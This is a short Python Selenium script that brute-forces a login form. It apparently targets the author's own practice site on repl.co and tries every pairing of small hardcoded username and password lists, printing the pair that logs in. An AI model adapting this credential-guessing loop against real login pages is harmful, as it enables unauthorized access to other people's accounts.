from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

#setup variables that can be changed in program?
userString = 'user'
passString= 'pass'

link = 'https://requestswebsite.notanothercoder.repl.co/'

#setup browser
browser = webdriver.Chrome()
browser.get(link)

#open user and password files
users = ['notsahana', 'bruh', 'username']
passkeys= ['password', 'bruh', 'ucool']


for line in users:
    for line2 in passkeys:
        userString = line.rstrip()
        passString = line2.rstrip()
        # find HTML elements by their id and fill in corresponding values
        username = browser.find_element_by_name('username')
        username.clear()
        username.send_keys(userString)
        password = browser.find_element_by_name('password')
        password.clear()
        password.send_keys(passString)
        
        #find the sign in button and hit dat
        signInButton = browser.find_element_by_id('myButton')
        signInButton.click()
        
        if (EC.presence_of_element_located((By.TAG_NAME, 'body'))):
            header = browser.find_element_by_tag_name('body').text
            time.sleep(2)
            if header == 'Logged In!':
            	print(line, line2)
            	browser.back()
            else:
            	browser.back()


#add
